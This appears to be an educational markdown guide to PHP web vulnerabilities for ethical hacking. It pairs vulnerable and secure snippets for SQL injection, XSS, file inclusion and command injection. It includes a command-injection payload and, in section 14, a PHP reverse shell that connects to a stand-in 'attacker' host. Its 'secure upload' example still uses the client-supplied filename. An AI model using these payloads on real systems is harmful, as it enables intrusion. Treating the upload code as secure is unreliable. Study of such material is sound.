## 📘 1. Introduction to PHP in Web Hacking
PHP is a widely-used scripting language in web development. Due to poor coding practices, PHP applications are often vulnerable to various attacks. This guide focuses on learning PHP from an ethical hacker's perspective.

---

## 🛠️ 2. Basic Input Handling (GET & POST)

### 🧾 GET Request:
```php
$user = $_GET['user'];
echo "Hello, $user";
```
- Data is passed in URL
- Easily visible & editable
- Vulnerable to XSS & SQLi if not sanitized

### 🧾 POST Request:
```php
$user = $_POST['user'];
$password = $_POST['pass'];
```
- Data is sent in HTTP body
- Safer for sensitive data

### ✅ Defense:
```php
$user = htmlspecialchars($_POST['user'], ENT_QUOTES);
```

---

## 🛡️ 3. SQL Injection

### ❌ Vulnerable Code:
```php
$query = "SELECT * FROM users WHERE username='$user'";
```

### ✅ Secure Code:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$user]);
```

---

## 🔥 4. File Upload Vulnerabilities
- MIME type spoofing
- Bypass `.php` file restrictions
- Shell upload

### ✅ Secure Upload:
```php
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$allowed = ['jpg','png'];
if (in_array($ext, $allowed)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/".$_FILES['file']['name']);
}
```

---

## 🔒 5. Password Handling
```php
$hash = password_hash($pass, PASSWORD_DEFAULT);
if (password_verify($pass, $hash)) {
    echo "Logged in!";
}
```

---

## 🔐 6. Session Security
- Use `session_regenerate_id()`
- Set cookie flags:
```php
ini_set("session.cookie_httponly", 1);
ini_set("session.cookie_secure", 1);
```

---

## 🛡️ 7. Cross-Site Scripting (XSS)
### ❌ Vulnerable:
```php
echo $_GET['msg'];
```
### ✅ Safe:
```php
echo htmlspecialchars($_GET['msg'], ENT_QUOTES);
```

---

## 🎯 8. CSRF (Cross-Site Request Forgery)
- Force user actions by sending crafted requests
- Use CSRF token in forms:
```php
<input type="hidden" name="token" value="<?= $_SESSION['token']; ?>">
```

---

## 🗂️ 9. File Inclusion Attacks (LFI/RFI)
### ❌ Vulnerable:
```php
include($_GET['page']);
```
### ✅ Secure:
```php
$whitelist = ['home', 'about'];
if (in_array($_GET['page'], $whitelist)) {
    include($_GET['page'].".php");
}
```

---

## 🧮 10. Type Juggling
### ❌ Weak Check:
```php
if ($_POST['is_admin'] == true)
```
### ✅ Strict Check:
```php
if ($_POST['is_admin'] === '1')
```

---

## 💣 11. OS Command Injection
### ❌ Vulnerable:
```php
system("ping -c 3 $_GET[ip]");
```
### ✅ Safe:
```php
$ip = escapeshellarg($_GET['ip']);
system("ping -c 3 $ip");
```

### 🧠 Dangerous Payload:
```
127.0.0.1; ls
```

---

## 📥 12. HTTP Header Attacks
| Header         | Abuse            |
|----------------|------------------|
| User-Agent     | Bot evasion      |
| Referer        | CSRF check bypass|
| Cookie         | Session hijacking|
| Host           | Header injection |

### ✅ Header Hardening:
```php
header("X-Frame-Options: DENY");
header("Content-Security-Policy: default-src 'self'");
```

---

## 🧰 13. Tools & Practice
- Burp Suite
- OWASP ZAP
- DVWA / BWAPP
- TryHackMe / HackTheBox

---

## 🔥 14. PHP Reverse Shell (For Labs Only)
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'");
?>
```

---

## 🧠 15. Summary:
- Sanitize all input
- Use HTTPS
- Avoid dynamic includes
- Disable dangerous PHP functions:
```ini
disable_functions = system, exec, shell_exec, passthru, popen
```

---

> ✅ Use this document for learning and ethical testing only. Build your own labs and test safely!
